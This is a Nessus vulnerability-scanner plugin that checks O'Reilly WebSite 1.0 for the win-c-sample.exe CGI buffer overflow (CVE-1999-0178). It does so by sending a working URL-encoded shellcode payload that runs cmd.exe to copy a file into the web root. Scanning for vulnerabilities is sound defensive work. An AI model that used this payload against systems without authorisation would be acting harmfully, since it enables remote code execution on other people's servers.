#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10008);
 script_version ("$Revision: 1.37 $");

 script_cve_id("CVE-1999-0178");
 script_bugtraq_id(2078);
 script_osvdb_id(8);

 script_name(english:"O'Reilly WebSite win-c-sample Remote Overflow");
 script_summary(english:"WebSite 1.0 CGI arbitrary code execution");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a remote buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"This web server appears to be a version of O'Reilly WebSite that has a
buffer overflow vulnerability in its '/cgi-shl/win-c-sample.exe'
script.  By passing a specially crafted argument to this script, an
unauthenticated, remote attacker can leverage this overflow to execute
arbitrary code on the affected host subject to the privileges under
which the service operates." );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://seclists.org/bugtraq/1997/Jan/25"
 );
 script_set_attribute(attribute:"solution", value:
"Upgrade to O'Reilly WebSite version 2.5, which reportedly addresses
the vulnerability."		 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(
  attribute:"vuln_publication_date", 
  value:"1997/01/06"
 );
 script_set_attribute(
  attribute:"plugin_publication_date", 
  value:"1999/06/22"
 );
 script_cvs_date("$Date: 2016/09/26 16:00:41 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_category(ACT_DESTRUCTIVE_ATTACK);

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

##########################
#			 #
# The actual script code # 
#			 #
##########################

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);


outfile = string("x1-", unixtime(), ".htm");
command = "/cgi-shl/win-c-sample.exe?+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+h^X%FF%E6%FF%D4%83%C6Lj%01V%8A%06<_u%03%80.?FAI%84%C0u%F0h0%10%F0wYhM\\y[X%050PzPA9%01u%F0%83%E9%10%FF%D1h0%10%F0wYh%D0PvLX%0500vPA9%01u%F0%83%E9%1C%FF%D1cmd.exe_/c_copy_\WebSite\readme.1st_\WebSite\htdocs\"+outfile;

res = is_cgi_installed3(item:outfile, port:port);
if(!res)
{
 is_cgi_installed3(item:command, port:port);
 res = is_cgi_installed3(item:outfile, port:port);
 if(res)
 {
  if (report_verbosity > 0)
  {
   report = string(
    "\n",
    "Nessus was able to verify the vulnerability exists using the following\n",
    "URLs :\n",
    "\n",
    "  ", build_url(port:port, qs:command), "\n",
    "  ", build_url(port:port, qs:"/"+outfile), "\n"
   );
   security_hole(port:port, extra:report);
  }
  else security_hole(port);
 }
}
